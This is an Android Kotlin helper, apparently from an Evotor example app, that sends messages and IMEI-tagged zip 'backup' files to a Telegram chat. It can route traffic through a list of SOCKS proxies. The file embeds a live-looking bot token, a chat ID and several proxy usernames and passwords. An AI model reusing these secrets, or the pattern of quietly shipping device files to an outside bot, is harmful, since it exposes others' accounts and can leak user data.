package ru.xcam.evotor.example.telegram

import android.util.Log
import okhttp3.*
import java.io.File
import java.io.IOException
import java.net.InetSocketAddress
import java.net.Proxy
import java.util.concurrent.TimeUnit


object TelegramApi {
    private const val TAG = "TelegramApi"
    private val SOURCE_CLIENT = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    private val proxyList = arrayListOf(
        ProxyData("203.160.59.145", 4145, null, null),
        ProxyData("46.105.57.150", 35993, null, null),
        ProxyData("206.248.184.127", 9050, null, null),
        ProxyData("46.101.128.70", 1080, "anon", "LwpBpd4"),
        ProxyData("200.115.48.39", 43446, null, null),
        ProxyData("190.128.150.110", 59163, null, null),
        ProxyData("tp.grishka.me", 1080, "tgproxy", "fuckrkn"),
        ProxyData("esowm.tgproxy.me", 1080, "telegram", "telegram"),
        ProxyData("138.68.174.236", 1080, "888352", "W2LGD6P3FK"),
        ProxyData("proxy.unlockgram.it", 5061, "telegram", "7ab5fpm35yapnhjj"),
        ProxyData("188.166.47.7", 1080, "telegram", "telegram"),
        ProxyData("138.68.174.236", 1080, "888352", "W2LGD6P3FK"),
        ProxyData("socks.serzhenko.me", 1080, "telegram", "S0cks"),
        ProxyData("socks.kuzmitch.ru", 1080, "socksuser", "heropass2"),
        ProxyData("proxy.bots.mn", 1080, "telegram", "telegram"),
        ProxyData("b3a0ea.tgvpnproxy.me", 1080, "8083949", "b56d2022"),
        ProxyData("nl10.proxy.veesecurity.com", 443, "PROXY_5AD1D032A270F", "fcb3d40d589ba31f"),
        ProxyData("par3.proxy.veesecurity.com", 443, "PROXY_5AD1D032A270F", "fcb3d40d589ba31f"),
        ProxyData("ams4.proxy.veesecurity.com", 443, "PROXY_5AD7B3785A30F", "87fcd6570a994138"),

        null
    )

    fun sendMessage(s: String): Boolean {
        val result = "" + s

//        if (tryToSendViaReqbin(result)) {
//            return true
//        }
//
//        if (tryToSendViaProxy(result)) {
//            return true
//        }

        if (tryToDirectSend(result)) {
            return true
        }

        Log.d(TAG, "FAIL!!!!!!!!!!!!")
        return false
    }

    private fun tryToSendViaReqbin(result: String): Boolean {
        try {
            val client = buildClient(null)
            val url = makeUrl(result)

            val json =
                """
        {
            "id":"0",
            "name":"",
            "json":"{
                \"method\":\"GET\",
                \"url\":\"$url\",
                \"contentType\":\"JSON\",
                \"content\":\"\",
                \"headers\":\"\",
                \"auth\":{
                    \"auth\":\"noAuth\",
                    \"bearerToken\":\"\",
                    \"basicUsername\":\"\",
                    \"basicPassword\":\"\",
                    \"customHeader\":\"\"
                }
            }"
        }
        """

            val requestBody = RequestBody.create(MediaType.parse("application/json"), json)

            val response = client.newCall(
                Request.Builder()
                    .url("https://reqbin.com/api/v1/Requests")
                    .post(requestBody)
                    .build()
            ).execute()

            return response.isSuccessful
        } catch (e: IOException) {
            e.printStackTrace()
            return false
        }
    }


    private fun tryToDirectSend(result: String): Boolean {
        try {
            val client = buildClient(null)

            val url = makeUrl(result)

            val response = client.newCall(
                Request.Builder()
                    .url(url)
                    .build()
            ).execute()

            Log.d(TAG, response.code().toString())

            response.body()?.let {
                Log.d(TAG, it.string())
                it.close()
            }
            return true
        } catch (e: IOException) {
            Log.e(TAG, "error", e)
        }
        return false
    }

    private fun tryToSendViaProxy(result: String): Boolean {
        for (i in 0 until proxyList.size) {
            try {
                val proxyNumber = i % proxyList.size
                val proxy = proxyList[proxyNumber]
                val client = buildClient(proxy)

                val url = makeUrl(result)

                val response = client.newCall(
                    Request.Builder()
                        .url(url)
                        .build()
                ).execute()

                Log.d(TAG, response.code().toString())

                response.body()?.let {
                    Log.d(TAG, it.string())
                    it.close()
                }
                return true
            } catch (e: IOException) {
                Log.e(TAG, "error", e)
            }
        }
        return false
    }

    fun makeUrl(text: String): HttpUrl {
        return HttpUrl.Builder()
            .scheme("https")
            .host("api.telegram.org")
            .addPathSegment("bot350465625:AAH7h5qgRvBMgu07l-wAK1hMkjnoJu2vv80")
            .addPathSegment("sendMessage")
            .addQueryParameter("chat_id", "-301306232")
            .addQueryParameter("text", text)
            .build()
    }


    @Throws(IOException::class)
    fun sendFile(file: File, imei: String): Boolean {

        for (i in 0 until proxyList.size) {
            try {
                val proxyNumber = i % proxyList.size
                val proxy = proxyList[proxyNumber]
                val client = buildClient(proxy)

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart(
                        "document", "backup-$imei-${System.currentTimeMillis()}.zip",
                        RequestBody.create(MediaType.parse("application/zip"), file)
                    )
                    .build()

                val url = HttpUrl.Builder()
                    .scheme("https")
                    .host("api.telegram.org")
                    .addPathSegment("bot350465625:AAH7h5qgRvBMgu07l-wAK1hMkjnoJu2vv80")
                    .addPathSegment("sendDocument")
                    .addQueryParameter("chat_id", "-301306232")
                    .build()

                Log.d(TAG, url.toString())

                val response = client.newCall(
                    Request.Builder()
                        .url(url)
                        .post(requestBody)
                        .build()
                ).execute()

                Log.d(TAG, response.code().toString())

                if (response.body() != null) {
                    Log.d(TAG, response.body()!!.string())
                    response.body()!!.close()
                }
                return true
            } catch (e: IOException) {
                Log.e(TAG, "error", e)
            }
        }
        return false
    }

    private fun buildClient(proxy: ProxyData?): OkHttpClient {
        return SOURCE_CLIENT.newBuilder()
            .also { builder ->
                Log.d(TAG, "Try proxy " + proxy?.proxyHost)
                if (proxy != null) {
                    builder.proxy(
                        Proxy(
                            Proxy.Type.SOCKS,
                            InetSocketAddress(proxy.proxyHost, proxy.proxyPort)
                        )
                    )
                        .also {
                            if (proxy.proxyUser != null) {
                                val authenticator = Authenticator { route, response ->
                                    val credential =
                                        Credentials.basic(proxy.proxyUser, proxy.proxyPassword)
                                    response.request().newBuilder()
                                        .header("Proxy-Authorization", credential)
                                        .build()
                                }
                                it.proxyAuthenticator(authenticator)
                            }
                        }
                }
            }
            .build()
    }

    private data class ProxyData(
        val proxyHost: String,
        val proxyPort: Int,
        val proxyUser: String? = null,
        val proxyPassword: String? = null
    )
}